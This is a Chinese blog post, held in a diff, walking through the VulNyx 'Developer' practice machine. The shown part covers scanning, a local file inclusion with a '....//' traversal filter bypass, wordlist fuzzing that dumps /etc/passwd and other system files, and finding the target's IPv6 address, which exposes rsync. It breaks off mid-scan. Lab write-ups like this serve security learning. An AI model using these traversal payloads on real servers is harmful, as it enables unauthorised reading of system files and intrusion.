@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulNyx - Developer">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-01T15:08:05.861Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="信息搜集">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="Fuzzing">
+<meta property="article:tag" content="VulNyx">
+<meta property="article:tag" content="WebThemez CMS">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="IPv6">
+<meta property="article:tag" content="Rsync">
+<meta property="article:tag" content="disable_functions">
+<meta property="article:tag" content="Awk">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/","path":"2024/06/01/VulNyx - Developer/","title":"VulNyx - Developer"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulNyx - Developer | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsync-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.4. rsync 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mike-%E7%94%A8%E6%88%B7"><span class="nav-text">2.2. mike 用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#james-%E7%94%A8%E6%88%B7"><span class="nav-text">2.3. james 用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root-%E7%94%A8%E6%88%B7"><span class="nav-text">2.4. root 用户</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E9%A1%BE"><span class="nav-text">3. 回顾</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">154</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">108</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulNyx - Developer | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulNyx - Developer
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-01 00:00:00 / 修改时间：23:08:05" itemprop="dateCreated datePublished" datetime="2024-06-01T00:00:00+08:00">2024-06-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://vulnyx.com/">VulNyx: Free Cybersecurity
+Platform | Enthusiasts &amp; Professionals</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.185</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 192.168.159.185 -p1-65535</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 23:38 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.185 (192.168.159.185)</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span><br><span class="line">MAC Address: 00:0C:29:63:16:71 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.85 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 部署了 WebThemez CMS，翻源码，可能存在 LFI</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406011923049.png" /></p>
+<p>尝试直接读取，得不到任何数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.185/pagecontact.php?page=php://filter/convert.base64-encode/resource=pagecontact.php</span><br><span class="line">http://192.168.159.185/pagecontact.php?page=/etc/passwd</span><br><span class="line">http://192.168.159.185/pagecontact.php?page=../../../etc/passwd</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
+<p>漏洞不存在 or 后端有过滤，暂存……</p>
+<p>80 扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.185/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html -f -t 50</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.185/</span><br><span class="line"></span><br><span class="line">[00:10:29] Starting: </span><br><span class="line">[00:10:30] 200 -    2KB - /contact.html                                     </span><br><span class="line">[00:10:30] 200 -    2KB - /about.html                                       </span><br><span class="line">[00:10:31] 200 -    2KB - /services.html                                    </span><br><span class="line">[00:10:31] 403 -  280B  - /icons/                                           </span><br><span class="line">[00:10:33] 200 -    2KB - /signup.html                                      </span><br><span class="line">[00:10:34] 301 -  319B  - /assets  -&gt;  http://192.168.159.185/assets/       </span><br><span class="line">[00:10:34] 200 -  475B  - /assets/                                          </span><br><span class="line">[00:10:41] 200 -    2KB - /portfolio.html                                   </span><br><span class="line">[00:10:49] 200 -    2KB - /signin.html                                      </span><br><span class="line">[00:37:19] 403 -  280B  - /server-status                                      </span><br><span class="line">[00:37:19] 403 -  280B  - /server-status/                                     </span><br><span class="line">                                                                                </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>有注册登录界面，但功能实现不完善，没法进一步利用，也没找到其他可用信息</p>
+<p>回到前面可能存在文件包含的点，跑字典尝试绕过</p>
+<p>经测下面字典可成功绕过过滤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u <span class="string">&quot;http://192.168.159.185/pagecontact.php?page=FUZZ&quot;</span> --hh 0</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406011954901.png" /></p>
+<p>应该是对 <code>../</code> 做了替换</p>
+<p><code>page=....//....//....//etc/passwd</code> 得</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:109::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mike:x:1001:1001::/home/mike:/bin/bash</span><br><span class="line">james:x:1002:1002::/home/james:/bin/bash</span><br><span class="line">dev:x:1000:1000::/home/dev:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>得用户 mike，james，dev</p>
+<p>跑个 linux 文件字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w linux_file_dic.txt -u <span class="string">&quot;http://192.168.159.185/pagecontact.php?page=....//....//..../FUZZ&quot;</span> --hh 0</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.185/pagecontact.php?page=....//....//..../FUZZ</span><br><span class="line">Total requests: 377</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload             </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000052:   200        20 L     78 W       765 Ch      <span class="string">&quot;/etc/issue&quot;</span>    </span><br><span class="line">000000032:   200        22 L     190 W      1042 Ch     <span class="string">&quot;/etc/crontab&quot;</span>  </span><br><span class="line">000000051:   200        67 L     257 W      1748 Ch     <span class="string">&quot;/etc/inputrc&quot;</span> </span><br><span class="line">000000036:   200        7 L      22 W       189 Ch      <span class="string">&quot;/etc/hosts&quot;</span>  </span><br><span class="line">000000033:   200        15 L     109 W      806 Ch      <span class="string">&quot;/etc/fstab&quot;</span>  </span><br><span class="line">000000035:   200        1 L      2 W        9 Ch        <span class="string">&quot;/etc/host.conf&quot;</span> </span><br><span class="line">000000037:   200        17 L     111 W      711 Ch      <span class="string">&quot;/etc/hosts.deny&quot;</span>   </span><br><span class="line">000000034:   200        55 L     55 W       714 Ch      <span class="string">&quot;/etc/group&quot;</span>   </span><br><span class="line">000000059:   200        15 L     52 W       360 Ch      <span class="string">&quot;/etc/network/interfaces&quot;</span>  </span><br><span class="line">000000055:   200        23 L     82 W       494 Ch      <span class="string">&quot;/etc/logrotate.conf&quot;</span>      </span><br><span class="line">000000061:   200        28 L     40 W       1459 Ch     <span class="string">&quot;/etc/passwd&quot;</span>          </span><br><span class="line">000000054:   200        2 L      2 W        34 Ch       <span class="string">&quot;/etc/ld.so.conf&quot;</span>   </span><br><span class="line">000000060:   200        4 L      6 W        60 Ch       <span class="string">&quot;/etc/networks&quot;</span>    </span><br><span class="line">000000089:   200        123 L    396 W      3274 Ch     <span class="string">&quot;/etc/ssh/sshd_config&quot;</span>  </span><br><span class="line">000000088:   200        1 L      3 W        564 Ch      <span class="string">&quot;/etc/ssh/ssh_host_rsa_key.pub&quot;</span>    </span><br><span class="line">000000080:   200        3 L      6 W        63 Ch       <span class="string">&quot;/etc/resolv.conf&quot;</span>   </span><br><span class="line">000000076:   200        64 L     474 W      2932 Ch     <span class="string">&quot;/etc/protocols&quot;</span>       </span><br><span class="line">000000082:   200        53 L     220 W      1650 Ch     <span class="string">&quot;/etc/ssh/ssh_config&quot;</span>   </span><br><span class="line">000000148:   200        5 L      33 W       391 Ch      <span class="string">&quot;/proc/net/arp&quot;</span>   </span><br><span class="line">000000155:   200        243 L    2310 W     22973 Ch    <span class="string">&quot;/proc/sched_debug&quot;</span>   </span><br><span class="line">000000153:   200        2 L      28 W       256 Ch      <span class="string">&quot;/proc/net/udp&quot;</span>    </span><br><span class="line">000000152:   200        3 L      46 W       450 Ch      <span class="string">&quot;/proc/net/tcp&quot;</span>      </span><br><span class="line">000000156:   200        0 L      1 W        27 Ch       <span class="string">&quot;/proc/self/cmdline&quot;</span>  </span><br><span class="line">000000147:   200        22 L     132 W      1553 Ch     <span class="string">&quot;/proc/mounts&quot;</span>   </span><br><span class="line">000000145:   200        1 L      4 W        97 Ch       <span class="string">&quot;/proc/cmdline&quot;</span>   </span><br><span class="line">000000151:   200        3 L      33 W       384 Ch      <span class="string">&quot;/proc/net/route&quot;</span>  </span><br><span class="line">000000150:   200        42 L     124 W      1115 Ch     <span class="string">&quot;/proc/net/fib_trie&quot;</span>  </span><br><span class="line">000000195:   200        0 L      1 W        10 Ch       <span class="string">&quot;/proc/self/loginuid&quot;</span>  </span><br><span class="line">000000201:   200        2 L      12 W       108 Ch      <span class="string">&quot;/proc/net/if_inet6&quot;</span>    </span><br><span class="line">000000197:   200        56 L     136 W      1355 Ch     <span class="string">&quot;/proc/self/status&quot;</span>  </span><br><span class="line">000000199:   200        1 L      21 W       185 Ch      <span class="string">&quot;/proc/version&quot;</span>     </span><br><span class="line">000000196:   200        1 L      52 W       319 Ch      <span class="string">&quot;/proc/self/stat&quot;</span>   </span><br><span class="line">000000285:   200        0 L      1 W        1152 Ch     <span class="string">&quot;/var/run/utmp&quot;</span>     </span><br><span class="line">000000374:   200        13 L     44 W       301 Ch      <span class="string">&quot;/etc/rsyncd.conf&quot;</span>  </span><br><span class="line">000000369:   200        138 L    859 W      4942 Ch     <span class="string">&quot;/etc/wgetrc&quot;</span>     </span><br><span class="line">000000368:   200        22 L     132 W      1553 Ch     <span class="string">&quot;/etc/mtab&quot;</span>     </span><br><span class="line"></span><br><span class="line">Total time: 0.375865</span><br><span class="line">Processed Requests: 377</span><br><span class="line">Filtered Requests: 341</span><br><span class="line">Requests/sec.: 1003.017</span><br></pre></td></tr></table></figure>
+<p>LFI 没读到私钥和日志信息，没法直接通过 LFI 来获取 shell</p>
+<p>获取 IPV6 地址，基于 ipv6 扫端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sX GET <span class="string">&#x27;http://192.168.159.185/pagecontact.php?page=....//....//....//proc/net/if_inet6&#x27;</span> | awk <span class="string">&#x27;NR==2 &#123;print $1&#125;&#x27;</span> | <span class="built_in">fold</span> -w4 | <span class="built_in">paste</span> -sd <span class="string">&quot;:&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012027733.png" /></p>
+<p>得 <code>fd15:4ba5:5a2b:1008:020c:29ff:fe63:1671</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -6 fd15:4ba5:5a2b:1008:020c:29ff:fe63:1671 -p1-65535</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-01 04:10 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fd15:4ba5:5a2b:1008:20c:29ff:fe63:1671</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.56 ((Debian))</span><br><span class="line">873/tcp open  rsync   (protocol version 31)</span><br><span class="line">MAC Address: 00:0C:29:63:16:71 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: 